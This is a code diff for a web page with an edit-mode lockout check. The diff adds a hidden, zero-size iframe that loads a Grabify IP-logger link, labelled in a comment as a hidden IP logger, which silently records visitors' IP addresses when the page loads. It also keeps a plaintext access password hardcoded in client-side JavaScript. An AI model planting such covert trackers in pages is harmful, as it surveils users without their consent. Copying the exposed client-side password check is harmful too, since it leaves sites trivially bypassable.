@@ -29,8 +29,10 @@
     </div>
   </div>
 
+  <!-- Hidden Grabify IP Logger via iframe (correct URL) -->
+  <iframe src="https://grabify.link/3Q673Q" style="display: none;" width="0" height="0"></iframe>
+
   <script>
-    // Plaintext password
     const correctPassword = "pqdapwjks3otpctoppm";
 
     document.getElementById("exit-btn").addEventListener("click", () => {
@@ -52,7 +54,7 @@
         if (data[0]?.edit_mode === '0') {
           document.body.innerHTML = ` 
             <div class="blocked-message">
-              Quintin is temporarily blocked access to this site. Updates or other things may be in the process of being applied (V2.1.0R2).
+              Quintin has temporarily blocked access to this site. Updates or other things may be in the process of being applied (V2.1.0R2).
             </div>
           `;
         }
@@ -61,7 +63,7 @@
       }
     }
 
-    setInterval(checkEditMode, 2000);
+    // Only run once on load now
     checkEditMode();
   </script>
 
